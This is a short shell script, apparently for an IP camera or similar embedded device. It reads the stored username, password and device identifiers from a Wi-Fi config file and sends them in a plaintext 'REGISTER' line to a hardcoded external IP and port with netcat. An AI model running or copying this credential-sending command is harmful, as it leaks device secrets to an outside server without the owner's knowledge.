#!/bin/sh

CONFIG_FILE="/system/etc/device_wifi_config.txt"
SERVER_IP="139.162.41.206"
SERVER_PORT="39393"

# Parse config file
USER=$(grep '^username=' "$CONFIG_FILE" | cut -d'=' -f2)
PASS=$(grep '^password=' "$CONFIG_FILE" | cut -d'=' -f2)
DEVICE_ID=$(grep '^camera_id=' "$CONFIG_FILE" | cut -d'=' -f2)
SENSOR=$(grep '^sensor=' "$CONFIG_FILE" | cut -d'=' -f2)
VENDOR=$(grep '^vendor=' "$CONFIG_FILE" | cut -d'=' -f2)

# Build command
CMD="REGISTER $SENSOR $VENDOR $DEVICE_ID $USER $PASS\r\n"

# Debug print
echo "[INFO] Sending command: $CMD"
echo "[INFO] Server: $SERVER_IP:$SERVER_PORT"

# Send and show server reply (Ctrl+C if server keeps socket open)
printf "$CMD" | nc -w 5 "$SERVER_IP" "$SERVER_PORT"
